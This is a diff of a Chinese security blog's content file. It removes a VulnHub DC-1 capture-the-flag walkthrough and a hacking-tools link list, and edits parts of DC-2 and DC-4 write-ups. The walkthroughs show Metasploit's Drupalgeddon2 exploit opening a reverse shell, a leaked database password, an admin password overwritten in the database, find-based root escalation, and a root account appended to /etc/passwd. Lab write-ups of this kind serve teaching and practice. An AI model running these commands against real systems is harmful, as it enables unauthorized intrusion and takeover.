@@ -13,128 +13,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DCchallenges1</title>
-    <url>/posts/7debd13b/</url>
-    <content><![CDATA[<p>安装</p>
-<p>下载解压后使用Vmware打开ova文件，选择桥接模式，同时也将kali设置为桥接模式</p>
-<br/>
-
-<p>环境</p>
-<blockquote>
-<p>网段 192.168.18.0/24</p>
-<p>kali 192.168.18.131</p>
-<p>靶机 192.168.18.130</p>
-</blockquote>
-<br/>
-
-<p>扫描网段</p>
-<blockquote>
-<p><strong>sudo nmap -sn 192.168.18.0/24</strong></p>
-<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:30 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.130<br>Host is up (0.00018s latency).<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00036s latency).<br>MAC Address: 00:50:56:F1:CD:81 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.16 seconds</p>
-</blockquote>
-<br/>
-
-<p>扫描靶机开放的端口</p>
-<blockquote>
-<p><strong>sudo nmap -sS 192.168.18.130</strong></p>
-<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:31 CST<br>Nmap scan report for 192.168.18.130<br>Host is up (0.000079s latency).<br>Not shown: 997 closed ports<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)</p>
-<p>Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds</p>
-<p>注：sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限</p>
-</blockquote>
-<p>发现开放了80端口，就用浏览器去访问一下<code>192.168.18.130:80</code> 根据网站页面显示信息可以判断是Drupal的CMS</p>
-<p>用dirsearch扫一下看看有什么</p>
-<blockquote>
-<p><strong>python3 dirsearch.py -u 192.168.18.130:80</strong></p>
-</blockquote>
-<p>用dirb 扫一下试试</p>
-<blockquote>
-<p><strong>dirb <a href="http://192.168.18.130/">http://192.168.18.130</a></strong></p>
-</blockquote>
-<p>没找到啥有用的信息，看下robots.txt</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>没什么有用的信息</p>
-<br/>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf6 &gt; search drupal</span><br><span class="line">msf6 &gt; use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; set rhosts 192.168.18.130</span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.18.131:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.18.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.18.131:4444 -&gt; 192.168.18.130:43581) at 2021-04-28 20:26:27 +0800</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">&#x2F;var&#x2F;www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: &#x2F;var&#x2F;www</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4653 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www</span><br><span class="line">cat falg1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">发现下面有个falg4  flag4:x:1001:1001:Flag4,,,:&#x2F;home&#x2F;flag4:&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;home&#x2F;flag4</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
-
-<br/>
-
-<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看网站配置 看有什么有用信息</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;site&#x2F;default</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br><span class="line"></span><br><span class="line">cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#39;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"> </span><br><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;drupaldb&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br/>
-
-<p>用python反弹个交互式shell<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
-<br/>
-
-<br/>
-
-<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>顺便得到了数据库信息，登录数据库看看</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www&#x2F;sites&#x2F;default$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 418639</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and&#x2F;or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and&#x2F;or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables from drupaldb;</span><br><span class="line">  ... ...</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |</span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia&#x2F;Melbourne |          |       0 | admin@example.com | b:0; |</span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia&#x2F;Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">drupal密码的加密是破解不出来，需要重置管理的密码(加密脚本位置在网站根目录下的scripts&#x2F;password-hash.sh)</span><br><span class="line">php scripts&#x2F;password-hash.sh admin  (admin是你要设置的新密码)</span><br><span class="line"></span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh admin</span><br><span class="line">php scripts&#x2F;password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 hash: $S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">去数据库修改密码</span><br><span class="line">mysql&gt; update users set pass &#x3D;&quot;$S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name&#x3D;&quot;admin&quot;;</span><br><span class="line">&lt;N1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name&#x3D;&quot;admin&quot;;                      </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">重置完密码后登录网站 (admin admin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="DCchallenges1.png"></p>
-<br/>
-
-<br/>
-
-<br/>
-
-<p>但是发现当前权限不够</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami </span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
-
-<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>使用<code>find</code>提权</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ touch dctest        </span><br><span class="line">touch dctest</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec whoami \;</span><br><span class="line">find dctest -exec whoami \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec ls &#x2F;root \;</span><br><span class="line">find dctest -exec ls &#x2F;root \;</span><br><span class="line">thefinalflag.txt</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec cat &#x2F;root&#x2F;thefinalflag.txt \;</span><br><span class="line">find dctest -exec cat &#x2F;root&#x2F;thefinalflag.txt \;</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#39;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
-<p><a href="https://www.freebuf.com/articles/web/260236.html">https://www.freebuf.com/articles/web/260236.html</a></p>
-<p><a href="https://blog.csdn.net/wang_624/article/details/90509951">https://blog.csdn.net/wang_624/article/details/90509951</a></p>
-<p><a href="https://f5.pm/go-53516.html">https://f5.pm/go-53516.html</a></p>
-<p><a href="https://www.freebuf.com/articles/network/218073.html">https://www.freebuf.com/articles/network/218073.html</a></p>
-<p><a href="https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1">https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>DCchallenges</category>
-      </categories>
-      <tags>
-        <tag>DCchallenges</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DCchallenges2</title>
     <url>/posts/e4e28081/</url>
     <content><![CDATA[<p>靶机DC-2下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
@@ -178,7 +56,7 @@
 <br/>
 
 <blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#x6f;&#98;&#105;&#x6e;&#64;&#x64;&#105;&#103;&#x69;&#46;&#110;&#105;&#110;&#x6a;&#x61;">&#x72;&#x6f;&#98;&#105;&#x6e;&#64;&#x64;&#105;&#103;&#x69;&#46;&#110;&#105;&#110;&#x6a;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#111;&#98;&#x69;&#110;&#64;&#100;&#105;&#103;&#105;&#46;&#x6e;&#x69;&#110;&#106;&#97;">&#x72;&#111;&#98;&#x69;&#110;&#64;&#100;&#105;&#103;&#105;&#46;&#x6e;&#x69;&#110;&#106;&#97;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
 <p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
 </blockquote>
 <p>使用wpscan爆破</p>
@@ -296,8 +174,8 @@
 <p>得到 <code>jim  jibril04</code></p>
 <p>连接ssh</p>
 <blockquote>
-<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#105;&#x6d;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;">&#106;&#105;&#x6d;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;</a></strong></p>
-<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#x69;&#x6d;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#56;&#x2e;&#x31;&#51;&#x35;">&#x6a;&#x69;&#x6d;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#56;&#x2e;&#x31;&#51;&#x35;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#105;&#x6d;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x31;&#56;&#46;&#49;&#51;&#x35;">&#106;&#105;&#x6d;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x31;&#56;&#46;&#49;&#51;&#x35;</a></strong></p>
+<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#105;&#109;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#51;&#x35;">&#106;&#105;&#109;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#51;&#x35;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
 <p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
 <p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
 <p><strong>jim@dc-4:~$ pwd</strong></p>
@@ -345,7 +223,7 @@
 <p>Mamor:x:0:0:::/bin/bash</p>
 <p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
 <blockquote>
-<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#97;&#109;&#x6f;&#114;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x38;&#46;&#x31;&#51;&#x35;">&#77;&#97;&#109;&#x6f;&#114;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x38;&#46;&#x31;&#51;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x4d;&#97;&#x6d;&#x6f;&#114;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#53;">&#x4d;&#97;&#x6d;&#x6f;&#114;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#x6d;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#51;&#x35;">&#77;&#97;&#x6d;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#51;&#x35;</a>‘s password: </p>
+<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#x4d;&#x61;&#x6d;&#111;&#114;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#49;&#56;&#x2e;&#x31;&#x33;&#53;">&#x4d;&#x61;&#x6d;&#111;&#114;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#49;&#56;&#x2e;&#x31;&#x33;&#53;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x4d;&#x61;&#109;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#53;">&#x4d;&#x61;&#109;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#x6d;&#x6f;&#x72;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x38;&#x2e;&#49;&#x33;&#x35;">&#77;&#97;&#x6d;&#x6f;&#x72;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x38;&#x2e;&#49;&#x33;&#x35;</a>‘s password: </p>
 <p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
 </blockquote>
 <p>构造失败，重新构造一个</p>
@@ -477,21 +355,327 @@
       </tags>
   </entry>
   <entry>
-    <title>Hacker_Tools-转</title>
-    <url>/posts/ec585c99/</url>
-    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
-<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
-<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
-<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
-<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a 